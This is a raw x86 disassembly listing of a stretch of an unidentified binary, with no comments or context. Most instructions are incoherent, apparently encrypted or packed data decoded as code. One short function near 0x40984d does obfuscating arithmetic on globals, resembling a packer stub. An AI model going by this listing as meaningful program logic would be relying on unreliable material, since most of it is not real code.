  409415:	jmp    0x6f54:0x1625c92d
  40941c:	jne    0x4093a6
  40941e:	xchg   esi,eax
  40941f:	mov    ds:0x3b719563,al
  409424:	and    BYTE PTR [esi-0xeb29bcd],0x46
  40942b:	jl     0x409480
  40942d:	adc    edi,esi
  40942f:	sbb    DWORD PTR [ecx-0x39],ebx
  409432:	xchg   edx,eax
  409433:	fwait
  409434:	clc    
  409435:	xlat   BYTE PTR ds:[ebx]
  409436:	pop    ebx
  409437:	jbe    0x409428
  409439:	pop    es
  40943a:	xchg   dl,al
  40943c:	adc    eax,0xf7fa24b5
  409441:	xor    DWORD PTR [eax+eiz*1+0x70556ce7],esp
  409448:	mov    edx,0xebd73c21
  40944d:	add    al,0xc5
  40944f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409450:	scas   eax,DWORD PTR es:[edi]
  409451:	add    DWORD PTR [ebp-0x62],edx
  409454:	rcr    BYTE PTR [ebx],cl
  409456:	repz ficomp WORD PTR [edi+ebx*8+0x2b]
  40945b:	jns    0x40940f
  40945d:	pusha  
  40945e:	sub    eax,0x4bb1c3ec
  409463:	out    0x2d,eax
  409465:	pushf  
  409466:	add    BYTE PTR [edx+0x2a53d683],bl
  40946c:	enter  0x2c24,0x3c
  409470:	lock test eax,0x24647ed
  409476:	fst    QWORD PTR [edx-0x442f1905]
  40947c:	call   0x9e6a:0x441eda5f
  409483:	cmp    BYTE PTR [esi+0x5c94a8],dh
  409489:	aas    
  40948a:	xchg   ebx,eax
  40948b:	sbb    DWORD PTR [ebx+0x1],edi
  40948e:	add    edi,edi
  409490:	inc    esp
  409491:	jns    0x409460
  409493:	jg     0x409417
  409495:	xor    DWORD PTR [ebx],ebp
  409497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409498:	adc    eax,0x2b8ab66b
  40949d:	add    al,0x2e
  40949f:	xchg   edx,eax
  4094a0:	fstp   QWORD PTR [edx]
  4094a2:	xchg   ebp,eax
  4094a3:	das    
  4094a4:	xchg   BYTE PTR [edi+0x38ca4a35],al
  4094aa:	xlat   BYTE PTR ds:[ebx]
  4094ab:	ss out dx,al
  4094ad:	mov    dl,0xab
  4094af:	fs loop 0x40950d
  4094b2:	dec    ebx
  4094b3:	pop    esp
  4094b4:	nop
  4094b5:	push   eax
  4094b6:	adc    ch,BYTE PTR [edx+0x1f]
  4094b9:	xor    dl,BYTE PTR ds:0x6a833b08
  4094bf:	dec    ebx
  4094c0:	xchg   edi,eax
  4094c1:	xor    eax,0xc3a336e9
  4094c6:	dec    ecx
  4094c7:	sbb    eax,0x3c6012bb
  4094cc:	in     eax,0xe6
  4094ce:	or     DWORD PTR [ecx],0xffffffa4
  4094d1:	mov    WORD PTR [edx],es
  4094d3:	lea    eax,[edx+0x6d]
  4094d6:	inc    edx
  4094d7:	bound  esp,QWORD PTR [ebp-0x45]
  4094da:	fidiv  WORD PTR [ecx+0x92719f4]
  4094e0:	xchg   ebp,eax
  4094e1:	outs   dx,DWORD PTR ds:[esi]
  4094e2:	pop    es
  4094e3:	sahf   
  4094e4:	pop    ecx
  4094e5:	scas   eax,DWORD PTR es:[edi]
  4094e6:	or     al,0xf3
  4094e8:	jnp    0x40948f
  4094ea:	pop    ebp
  4094eb:	out    0x1b,eax
  4094ed:	xchg   esp,eax
  4094ee:	add    DWORD PTR [ebx],0x18110cd7
  4094f4:	test   eax,0x332f4b19
  4094f9:	push   ss
  4094fa:	pop    ds
  4094fb:	mov    DWORD PTR [esi+0x365f68a2],esp
  409501:	mov    ebx,0xf842a52b
  409506:	lahf   
  409507:	push   ecx
  409508:	lock jnp 0x4094c8
  40950b:	clc    
  40950c:	adc    BYTE PTR [esi],cl
  40950e:	and    ebp,DWORD PTR [eax-0x66]
  409511:	jae    0x409579
  409513:	mov    ah,0x39
  409515:	push   0x39
  409517:	rcl    DWORD PTR [ebx-0xf950c63],1
  40951d:	aas    
  40951e:	cli    
  40951f:	mov    cl,bl
  409521:	push   esi
  409522:	(bad)  
  409523:	mov    esp,0xc6e883ea
  409528:	popa   
  409529:	sub    DWORD PTR [eax],esp
  40952b:	mov    ah,0xa9
  40952d:	and    bl,0x5
  409530:	cmp    bl,BYTE PTR [edi]
  409532:	call   0x178d:0xc8c8dac6
  409539:	sub    BYTE PTR ds:0x6ccd7b2a,bh
  40953f:	loope  0x40953b
  409541:	and    eax,0xeccca1e0
  409546:	sti    
  409547:	adc    al,0x0
  409549:	fcomp  DWORD PTR [eax-0x1d78f13a]
  40954f:	jmp    0x409593
  409551:	fwait
  409552:	aas    
  409553:	ret    
  409554:	les    ebp,FWORD PTR [ebp-0x69f5dbab]
  40955a:	in     al,0xb
  40955c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40955d:	aas    
  40955e:	and    DWORD PTR [ebx+0x3aae06f4],esi
  409564:	test   eax,0x3feb5ddf
  409569:	mov    bh,BYTE PTR [esi+0x4a]
  40956c:	fs push eax
  40956e:	lock cmp ecx,DWORD PTR [esi]
  409571:	div    esi
  409573:	mov    ds:0x7a55515d,al
  409578:	xchg   ebp,eax
  409579:	(bad)  [edx]
  40957b:	dec    ebp
  40957c:	xor    esi,ecx
  40957e:	xchg   ebp,esi
  409580:	xlat   BYTE PTR ds:[ebx]
  409581:	pop    ds
  409582:	lahf   
  409583:	push   es
  409584:	add    al,0x6b
  409586:	cmp    al,0xa9
  409588:	retf   
  409589:	aam    0x8d
  40958b:	dec    ebp
  40958c:	call   0x377a:0xfd616174
  409593:	cmp    eax,DWORD PTR [edi+0x643f4ace]
  409599:	gs ins DWORD PTR es:[edi],dx
  40959b:	jo     0x4095fb
  40959d:	inc    esi
  40959e:	cmc    
  40959f:	or     DWORD PTR [esi],ecx
  4095a1:	mov    edx,DWORD PTR [edi]
  4095a3:	das    
  4095a4:	or     DWORD PTR ds:0x720110e2,ebp
  4095aa:	sub    ah,BYTE PTR [edx+esi*4]
  4095ad:	lods   al,BYTE PTR ds:[esi]
  4095ae:	dec    ecx
  4095af:	test   edi,edx
  4095b1:	mov    WORD PTR [edx-0x3c],?
  4095b4:	lds    eax,FWORD PTR [edx+0x46334e7d]
  4095ba:	lock jae 0x409606
  4095bd:	(bad)  
  4095be:	es out dx,al
  4095c0:	fs pop edx
  4095c2:	fs out 0x2,al
  4095c5:	xchg   ah,bl
  4095c7:	in     eax,dx
  4095c8:	ret    0xc3d1
  4095cb:	cmovns edx,DWORD PTR [esi]
  4095ce:	mov    ds:0xba0afc6d,al
  4095d3:	and    BYTE PTR [esi],ch
  4095d5:	sub    ah,BYTE PTR [edi+0x6ecc0587]
  4095db:	mov    edi,0x77b2c82e
  4095e0:	stos   DWORD PTR es:[edi],eax
  4095e1:	or     eax,0x1cf38166
  4095e6:	cmp    dh,BYTE PTR [edi]
  4095e8:	sbb    eax,0xd520e856
  4095ed:	(bad)  
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e92:0xd10d984e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	push   edx
  40960d:	xor    ch,BYTE PTR [ecx+eiz*8-0x33468ede]
  409614:	rol    BYTE PTR [ebx+0x6ec48f70],1
  40961a:	sbb    BYTE PTR [edi+0x1a],cl
  40961d:	mov    BYTE PTR [eax+0x10c07600],bl
  409623:	mov    al,ds:0xa3b5ba5f
  409628:	outs   dx,BYTE PTR ds:[esi]
  409629:	out    0x67,eax
  40962b:	sti    
  40962c:	push   ds
  40962d:	setge  BYTE PTR ds:0x46a6d6d8
  409634:	ret    
  409635:	push   ecx
  409636:	inc    esi
  409637:	xor    eax,0x8c1673ec
  40963c:	into   
  40963d:	xor    ch,BYTE PTR [ebx+0x10158e9c]
  409643:	push   esp
  409644:	xor    eax,0x2a13898c
  409649:	ret    0xaeee
  40964c:	xchg   esi,eax
  40964d:	mov    al,0xb1
  40964f:	push   ecx
  409650:	mov    BYTE PTR [ecx+0x7c27da63],ch
  409656:	rcr    DWORD PTR [edx-0x11],cl
  409659:	sub    DWORD PTR [ebp+0x46a0824c],ebp
  40965f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409660:	hlt    
  409661:	cld    
  409662:	sahf   
  409663:	call   0x496e:0x9afa0d61
  40966a:	enter  0x4a69,0x49
  40966e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40966f:	addr16 mov al,ah
  409672:	cmpxchg BYTE PTR [ecx+ecx*2],bl
  409676:	repz xchg edi,eax
  409678:	out    dx,eax
  409679:	cmp    eax,0xc12f961d
  40967e:	enter  0xd80d,0x21
  409682:	mov    ebx,fs
  409684:	scas   al,BYTE PTR es:[edi]
  409685:	or     bl,dl
  409687:	xchg   ecx,eax
  409688:	outs   dx,DWORD PTR ds:[esi]
  409689:	or     esi,esp
  40968b:	cmc    
  40968c:	ins    DWORD PTR es:[edi],dx
  40968d:	int    0xca
  40968f:	out    0x4f,eax
  409691:	or     BYTE PTR [ecx+0x396d7cfb],dh
  409697:	sbb    eax,0x8303ab61
  40969c:	xor    BYTE PTR [eax-0x2c],0x84
  4096a0:	xor    eax,DWORD PTR [ecx+ebp*8-0x3075f8a6]
  4096a7:	scas   eax,DWORD PTR es:[edi]
  4096a8:	enter  0x696,0x6
  4096ac:	xchg   DWORD PTR [edx],ebx
  4096ae:	jne    0x4096a0
  4096b0:	sub    al,0xdb
  4096b2:	jae    0x409691
  4096b4:	and    eax,0xd3e76326
  4096b9:	push   cs
  4096ba:	mov    WORD PTR [eax-0x3028c301],?
  4096c0:	sub    esi,DWORD PTR [eax]
  4096c2:	jns    0x40973f
  4096c4:	sar    BYTE PTR [esi],cl
  4096c6:	xor    cl,BYTE PTR [ebx]
  4096c8:	add    al,0x1
  4096ca:	stos   DWORD PTR es:[edi],eax
  4096cb:	out    dx,al
  4096cc:	sub    al,0x4d
  4096ce:	push   edx
  4096cf:	je     0x4096c2
  4096d1:	gs mov eax,0xaa8fdc9d
  4096d7:	adc    ah,ah
  4096d9:	call   0xa682:0x749dc612
  4096e0:	stos   BYTE PTR es:[edi],al
  4096e1:	out    0xe,al
  4096e3:	std    
  4096e4:	mov    eax,ds:0xa1efe1fe
  4096e9:	pop    es
  4096ea:	jle    0x409670
  4096ec:	das    
  4096ed:	sar    DWORD PTR [ebp-0x2c],0xa5
  4096f1:	imul   ebx,DWORD PTR [ebx],0x6fa47491
  4096f7:	sub    DWORD PTR gs:[eax+eiz*4+0x4fc2ca9f],edx
  4096ff:	cmc    
  409700:	sbb    DWORD PTR [esi],ecx
  409702:	dec    ebx
  409703:	(bad)  
  409704:	ret    
  409705:	setnp  BYTE PTR [edx+0x7e]
  409709:	jnp    0x4096e4
  40970b:	not    DWORD PTR [eax+ecx*4+0x4a]
  40970f:	jbe    0x40975f
  409711:	push   0x52
  409713:	ja     0x409706
  409715:	lods   al,BYTE PTR ds:[esi]
  409716:	test   al,0x66
  409718:	ds xchg edx,eax
  40971a:	sub    ebp,DWORD PTR [esi-0x3a6f125f]
  409720:	loope  0x409798
  409722:	sbb    eax,0xab4a4976
  409727:	mov    al,0x9b
  409729:	mov    ecx,0x8b007455
  40972e:	fmul   QWORD PTR [ebx]
  409730:	loop   0x4096c3
  409732:	xchg   ecx,eax
  409733:	mov    bl,0x40
  409735:	(bad)  
  409736:	fisubr DWORD PTR fs:[edx]
  409739:	jns    0x4096ed
  40973b:	add    eax,DWORD PTR [ebx+eiz*4+0x4ccbc662]
  409742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409743:	or     BYTE PTR [ecx+0x2feff515],dh
  409749:	jecxz  0x4096e4
  40974b:	shl    BYTE PTR [ebp-0x7c],cl
  40974e:	mov    DWORD PTR [esi-0xa470c76],ebx
  409754:	xor    al,bl
  409756:	lods   eax,DWORD PTR ds:[esi]
  409757:	dec    esp
  409758:	leave  
  409759:	jb     0x409773
  40975b:	push   edi
  40975c:	inc    esi
  40975d:	sub    bl,cl
  40975f:	push   eax
  409760:	int    0x79
  409762:	mov    al,0x23
  409764:	pop    edi
  409765:	clc    
  409766:	js     0x409782
  409768:	dec    ch
  40976a:	push   cs
  40976b:	dec    ebp
  40976c:	inc    edi
  40976d:	ror    BYTE PTR [ebx-0x1c],0xb1
  409771:	mov    bh,0x53
  409773:	or     ch,ah
  409775:	mov    edi,cs
  409777:	dec    edx
  409778:	xchg   esi,eax
  409779:	xor    ebx,DWORD PTR ds:0xcf72a359
  40977f:	test   DWORD PTR [edx],edx
  409781:	mov    ebx,0x4f0001d6
  409786:	inc    esp
  409787:	loopne 0x409734
  409789:	iret   
  40978a:	test   dh,ch
  40978c:	call   0x25a6500e
  409791:	and    bh,BYTE PTR [eax+0x65]
  409794:	push   0x7b06a93
  409799:	cmp    ecx,ebx
  40979b:	in     al,0xc2
  40979d:	mov    al,ds:0xcca94932
  4097a2:	iret   
  4097a3:	f2xm1  
  4097a5:	dec    eax
  4097a6:	mov    ecx,0x1b1c9afc
  4097ab:	jae    0x4097bd
  4097ad:	pop    ebx
  4097ae:	fidivr DWORD PTR [eax]
  4097b0:	inc    edi
  4097b1:	into   
  4097b2:	pop    edi
  4097b3:	mov    bh,0x6e
  4097b5:	cli    
  4097b6:	xlat   BYTE PTR ds:[ebx]
  4097b7:	inc    ecx
  4097b8:	sbb    bl,BYTE PTR [esi-0x78700b0e]
  4097be:	jmp    0xb3db:0x6c571e89
  4097c5:	push   esi
  4097c6:	frstor [esi-0x45]
  4097c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097ca:	lea    edx,[edi+ebp*8-0x121712db]
  4097d1:	jp     0x4097b6
  4097d3:	xchg   edx,eax
  4097d4:	jo     0x409817
  4097d6:	shr    al,1
  4097d8:	in     eax,dx
  4097d9:	out    dx,al
  4097da:	inc    edi
  4097db:	lods   al,BYTE PTR ds:[esi]
  4097dc:	in     eax,0x5e
  4097de:	loopne 0x4097d7
  4097e0:	fistp  DWORD PTR ds:0x65dcfedc
  4097e6:	push   cs
  4097e7:	and    eax,0xd5822af3
  4097ec:	jns    0x4097e5
  4097ee:	mov    ds:0x10f5494,al
  4097f3:	aaa    
  4097f4:	jmp    0x6e6d:0xb354b534
  4097fb:	mov    al,0x85
  4097fd:	xor    al,0xa3
  4097ff:	mov    bl,BYTE PTR [edx+0x5b76d0ff]
  409805:	add    DWORD PTR [ebx],ebp
  409807:	ins    BYTE PTR es:[edi],dx
  409808:	dec    ebp
  409809:	jecxz  0x4097bf
  40980b:	pop    ds
  40980c:	test   BYTE PTR [ecx+edi*2-0x3d],bh
  409810:	adc    edx,esp
  409812:	rol    DWORD PTR [edi],cl
  409814:	mov    ds:0x9226c014,al
  409819:	push   0x1c
  40981b:	cmp    edx,edx
  40981d:	add    ecx,edi
  40981f:	or     DWORD PTR gs:[edx],0xbfa08be5
  409826:	jno    0x409870
  409828:	ficomp WORD PTR [ebp+0x3a1050c2]
  40982e:	mov    ch,0x4
  409830:	getsec 
  409832:	xchg   ebp,eax
  409833:	ss retf 0x8bc8
  409837:	inc    ebp
  409838:	hlt    
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x43385f
  40986f:	xor    DWORD PTR ds:0x433797,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x43385b,0x43382b
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x4337e7,0x433893
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x43377b
  4098a6:	sub    DWORD PTR ds:0x43385f,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	enter  0xa967,0x93
  4098c4:	mov    ah,0xd9
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	lock mov al,ds:0xc612e84f
  4098d2:	cmc    
  4098d3:	or     eax,0x58956f08
  4098d8:	add    BYTE PTR [edx+eiz*1+0x59],ch
  4098dc:	ftst   
  4098de:	data16 sub dl,cl
  4098e1:	rcr    BYTE PTR [esi+ecx*4],0x29
  4098e5:	sub    al,0x74
  4098e7:	xchg   BYTE PTR ds:0xa9298438,ah
  4098ed:	mov    dh,0x30
  4098ef:	retf   0x9e06
  4098f2:	je     0x40996d
  4098f4:	jbe    0x4098a2
  4098f6:	cmp    DWORD PTR [ecx+0x69eac217],eax
  4098fc:	xor    esi,ebp
  4098fe:	xor    al,0x48
  409900:	inc    esi
  409901:	sbb    DWORD PTR [edi+edx*2+0x404d31e1],esi
  409908:	mov    ch,0x4f
  40990a:	pop    ds
  40990b:	cmp    al,0x71
  40990d:	rcr    ebx,0x1a
  409910:	int3   
  409911:	test   BYTE PTR [ebp+0x65],dl
  409914:	imul   esp,ecx,0x4ed59f79
  40991a:	pop    ds
  40991b:	push   esi
  40991c:	adc    bh,BYTE PTR [ebx-0x7a]
  40991f:	sub    DWORD PTR [eax+edi*1],0x13d18794
  409926:	dec    esi
  409927:	retf   
  409928:	or     ah,BYTE PTR [ebx+0x10]
  40992b:	jecxz  0x409972
  40992d:	inc    esp
  40992e:	or     eax,0x554e6a1a
  409933:	stos   BYTE PTR es:[edi],al
  409934:	neg    esi
  409936:	jno    0x4098cd
  409938:	enter  0xa196,0xe1
  40993c:	mov    dl,0x82
  40993e:	inc    ecx
  40993f:	jmp    0x714d:0x58c1bea1
  409946:	call   DWORD PTR [ebp-0x32e17333]
  40994c:	dec    edi
  40994d:	and    bh,cl
  40994f:	aad    0x91
  409951:	clc    
  409952:	push   cs
  409953:	xchg   BYTE PTR [ebx],cl
  409955:	push   ds
  409956:	lods   eax,DWORD PTR ds:[esi]
  409957:	nop
  409958:	or     eax,DWORD PTR [edi]
  40995a:	call   0x91ac52c6
  40995f:	ficom  WORD PTR [esi-0x5b1a9d17]
  409965:	add    dl,0x6a
  409968:	adc    BYTE PTR [edi+0x4a],cl
  40996b:	mov    ds:0x220187db,eax
  409970:	(bad)  
  409971:	cmp    dl,BYTE PTR ds:0xf314b81b
  409977:	jno    0x4099db
  409979:	test   eax,0xa19df4ff
  40997e:	lock xor BYTE PTR [esi],dl
  409981:	cmp    ecx,DWORD PTR [edx+0x4f6f0e18]
  409987:	xchg   ebp,eax
  409988:	dec    edi
  409989:	loopne 0x4099df
  40998b:	sub    BYTE PTR [edi+eiz*4+0x78],dl
  40998f:	push   edx
  409990:	scas   al,BYTE PTR es:[edi]
  409991:	mov    ds:0xf00ff88d,al
  409996:	jmp    0xe3d7:0x1d7b3e5b
  40999d:	jno    0x409987
  40999f:	mov    ebx,0xbd6f5aa0
  4099a4:	cwde   
  4099a5:	inc    esp
  4099a6:	pop    ecx
  4099a7:	sub    ch,dh
  4099a9:	lds    eax,FWORD PTR [ebp+ecx*1-0x48]
  4099ad:	mov    ecx,0xf9d66644
  4099b2:	adc    al,0xc5
  4099b4:	sbb    bl,ch
  4099b6:	retf   
  4099b7:	je     0x4099f2
  4099b9:	cmp    DWORD PTR [esi+0x1f47bc52],edi
  4099bf:	mov    ah,0xd1
  4099c1:	jno    0x4099f8
  4099c3:	repnz (bad) [eax]
  4099c6:	cmp    BYTE PTR [edx],dh
  4099c8:	push   ds
  4099c9:	xor    dh,bl
  4099cb:	adc    cl,BYTE PTR [ebx-0xe447a2a]
  4099d1:	imul   ebp,DWORD PTR [edx-0x3f],0x33
  4099d5:	nop
  4099d6:	inc    BYTE PTR [ebx]
  4099d8:	cmp    ecx,DWORD PTR [ebp-0x2f]
  4099db:	test   DWORD PTR [ecx+0x25158f24],esi
  4099e1:	std    
  4099e2:	sbb    BYTE PTR ds:0xa4f6b829,dh
  4099e8:	ja     0x4099cf
  4099ea:	and    eax,0x183212c6
  4099ef:	dec    edx
  4099f0:	leave  
  4099f1:	dec    ecx
  4099f2:	jnp    0x409a01
  4099f4:	push   ss
  4099f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099f6:	jbe    0x4099b3
  4099f8:	retf   0xa30c
  4099fb:	sar    DWORD PTR [ebx-0x4a1bc9c8],cl
  409a01:	or     ecx,DWORD PTR [esi]
  409a03:	lahf   
  409a04:	jge    0x409a2c
  409a06:	sbb    dl,BYTE PTR [esi+esi*8-0x5c87dbac]
  409a0d:	push   ss
  409a0e:	sub    BYTE PTR ds:0x4c0d14bd,al
  409a14:	push   ss
  409a15:	pop    ds
  409a16:	adc    cl,BYTE PTR [ebx+eiz*8-0x2c52d3b7]
  409a1d:	pop    ecx
  409a1e:	adc    BYTE PTR [esi],cl
  409a20:	jmp    0x271b:0x663c96ce
  409a27:	add    BYTE PTR [edi-0x677129d4],bh
  409a2d:	adc    BYTE PTR [ecx+0x5a],0x65
  409a31:	dec    esp
  409a32:	xchg   esp,eax
  409a33:	xchg   ecx,eax
  409a34:	xor    BYTE PTR [ebx],bh
  409a36:	out    dx,al
  409a37:	cli    
  409a38:	xor    edi,DWORD PTR ds:0x662fa706
  409a3e:	jno    0x4099e7
  409a40:	push   ecx
  409a41:	(bad)  
  409a42:	xor    DWORD PTR [edi+0x1e],0x84939b34
  409a49:	fst    DWORD PTR [ebx]
  409a4b:	mov    ch,0xcd
  409a4d:	(bad)  ds:0x3db6903f
  409a53:	stos   DWORD PTR es:[edi],eax
  409a54:	push   ebp
  409a55:	loope  0x409a9e
  409a57:	xor    ebp,DWORD PTR [edx-0x5577fc2d]
  409a5d:	push   0x7a
  409a5f:	jle    0x409a9f
  409a61:	aam    0x62
  409a63:	pusha  
  409a64:	in     eax,dx
  409a65:	dec    ecx
  409a66:	lea    ebp,[ebp+0x4be6ca58]
  409a6c:	mov    esp,DWORD PTR ds:0x11d5db28
  409a72:	rcr    ebx,0x1d
  409a75:	shl    DWORD PTR [esi+0x1b],cl
  409a78:	adc    BYTE PTR [ecx+0x5cecc454],dh
  409a7e:	ins    BYTE PTR es:[edi],dx
  409a7f:	push   ebp
  409a80:	jl     0x409a1a
  409a82:	pop    edx
  409a83:	sub    BYTE PTR [esi-0xe],al
  409a86:	and    DWORD PTR [eax],0x1f
  409a89:	fcom   DWORD PTR [ecx]
  409a8b:	out    dx,al
  409a8c:	xchg   BYTE PTR [esp+edx*8-0x1bacd4f3],ch
  409a93:	push   cs
  409a94:	lds    edi,FWORD PTR [eax+0x48c7c68c]
  409a9a:	cs popf 
  409a9c:	jp     0x409ae8
  409a9e:	pop    esp
  409a9f:	cwde   
  409aa0:	dec    eax
  409aa1:	or     DWORD PTR [ebp-0x216b7ceb],edx
  409aa7:	mov    bh,0xde
  409aa9:	mov    bl,0x7d
  409aab:	mov    ds:0x4e46a3c8,al
  409ab0:	repnz test eax,0x8049199c
  409ab6:	add    cl,BYTE PTR [edx]
  409ab8:	push   ecx
  409ab9:	(bad)  
  409aba:	jne    0x409b1f
  409abc:	dec    ebx
  409abd:	mov    eax,ds:0x6ef25e
  409ac2:	ror    DWORD PTR [esi],0x79
  409ac5:	or     BYTE PTR [esi+0x55],dh
  409ac8:	cmp    al,0xd
  409aca:	fcmovu st,st(7)
  409acc:	in     al,dx
  409acd:	jns    0x409af0
  409acf:	mov    bl,0x8b
  409ad1:	jbe    0x409aa3
  409ad3:	fcmovu st,st(5)
  409ad5:	retf   0x488e
  409ad8:	cmp    esp,DWORD PTR [edx]
  409ada:	mov    BYTE PTR [edi+0x2b],0x8b
  409ade:	xchg   edi,eax
  409adf:	rcr    BYTE PTR [ebp+0xb],0xc6
  409ae3:	into   
  409ae4:	in     eax,dx
  409ae5:	push   ebx
  409ae6:	inc    esp
  409ae7:	rcr    DWORD PTR [ebx+0x3e],cl
  409aea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aeb:	push   eax
  409aec:	repz (bad) 
  409aee:	jb     0x409b21
  409af0:	adc    bl,BYTE PTR [edi]
  409af2:	shl    BYTE PTR [edx+0x1b],cl
  409af5:	nop
  409af6:	test   DWORD PTR [edx-0x34],ebp
  409af9:	cmp    ch,ch
  409afb:	add    eax,0xa6225cd
  409b00:	push   0x65165194
  409b05:	psadbw mm4,QWORD PTR [eax-0x1cfc895a]
  409b0c:	xchg   DWORD PTR [esi+0x52],esi
  409b0f:	cmp    bl,BYTE PTR [esi]
  409b11:	out    0x56,al
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43381f,0x4337d3
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x32aeb6d4]
  409b32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b33:	jle    0x409b19
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	shl    DWORD PTR [ebx],cl
  409b3d:	(bad)  
  409b3e:	push   eax
  409b3f:	push   ss
  409b40:	jns    0x409afe
  409b42:	inc    esi
  409b43:	sbb    ebx,DWORD PTR [ebx]
  409b45:	dec    eax
  409b46:	ins    DWORD PTR es:[edi],dx
  409b47:	nop
  409b48:	xchg   ecx,eax
  409b49:	mov    al,0x84
  409b4b:	jecxz  0x409b22
  409b4d:	rcr    DWORD PTR [ebx],0x12
  409b50:	je     0x409b1b
  409b52:	sbb    cl,BYTE PTR [esi+0x17]
  409b55:	test   DWORD PTR [ecx+0x4b],esp
  409b58:	jle    0x409b6b
  409b5a:	loopne 0x409b2c
  409b5c:	sar    dl,0xaa
  409b5f:	adc    eax,DWORD PTR [ecx+0x4471ff67]
  409b65:	mov    bl,0xc8
  409b67:	in     eax,0x8a
  409b69:	cli    
  409b6a:	mov    bh,0xec
  409b6c:	(bad)  
  409b6d:	push   es
  409b6e:	loope  0x409b57
  409b70:	cmp    edx,DWORD PTR [ebp-0x2b]
  409b73:	jne    0x409b34
  409b75:	mov    WORD PTR [ebx],?
  409b77:	inc    esi
  409b78:	sbb    DWORD PTR [edx],ebx
  409b7a:	cmp    BYTE PTR [esi+0x526abf09],bh
  409b80:	pop    edx
  409b81:	ret    
  409b82:	fs fmul st,st(7)
  409b85:	int    0x26
  409b87:	sti    
  409b88:	cmc    
  409b89:	jecxz  0x409baf
  409b8b:	mov    ds:0x552a89ed,eax
  409b90:	inc    eax
  409b91:	pop    edx
  409b92:	mov    ecx,0x25790ab2
  409b97:	fst    QWORD PTR [edi+0x64]
  409b9a:	jmp    0x409be7
  409b9c:	inc    esi
  409b9d:	or     BYTE PTR [ebp+esi*8-0x54],dh
  409ba1:	xchg   esp,eax
  409ba2:	fistp  QWORD PTR [ebx+0x3f]
  409ba5:	cmp    eax,0x2806bd4a
  409baa:	in     eax,0xee
  409bac:	pushf  
  409bad:	pop    es
  409bae:	jle    0x409be7
  409bb0:	shl    dh,1
  409bb2:	cmp    ch,BYTE PTR [ebp-0x61d534ed]
  409bb8:	mov    BYTE PTR [ebx-0x6d08da6b],ch
  409bbe:	lods   eax,DWORD PTR ds:[esi]
  409bbf:	cmp    edx,DWORD PTR [edx+0x64257e58]
  409bc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bc6:	jcxz   0x409b4f
  409bc9:	inc    esp
  409bca:	sbb    cl,BYTE PTR [eax-0x80]
  409bcd:	out    0xdd,al
  409bcf:	into   
  409bd0:	popa   
  409bd1:	fxch   st(4)
  409bd3:	pop    ecx
  409bd4:	xor    eax,0x32d0baf9
  409bd9:	mov    ebx,0xfb71f49
  409bde:	cmp    dh,BYTE PTR [edx-0x68bd8a06]
  409be4:	mov    edx,0x232a15e3
  409be9:	sbb    eax,0x1e4bf754
  409bee:	enter  0xd91,0x22
  409bf2:	xor    cl,0xab
  409bf5:	pop    eax
  409bf6:	into   
  409bf7:	inc    edi
  409bf8:	loope  0x409bc3
  409bfa:	mov    al,ds:0xb68254ae
  409bff:	jp     0x409c3a
  409c01:	and    al,0x74
  409c03:	fisubr WORD PTR [eax+0xa]
  409c06:	lahf   
  409c07:	gs inc esi
  409c09:	arpl   WORD PTR [ebp-0x1bfbe23c],di
  409c0f:	push   ebx
  409c10:	pop    esi
  409c11:	scas   eax,DWORD PTR es:[edi]
  409c12:	sbb    eax,0x3e1b2504
  409c17:	cs mov esp,0xdea72735
  409c1d:	pop    esp
  409c1e:	and    dh,BYTE PTR [edi+ebp*4]
  409c21:	loop   0x409c29
  409c23:	aad    0xa3
  409c25:	inc    esi
  409c26:	cs (bad) 
  409c28:	mov    BYTE PTR [eax+edx*4+0x1c],dl
  409c2c:	(bad)  
  409c2d:	push   esp
  409c2e:	mov    ?,esp
  409c30:	and    ebx,ebp
  409c32:	adc    esi,esi
  409c34:	mov    bh,0xce
  409c36:	std    
  409c37:	enter  0xc7ec,0x40
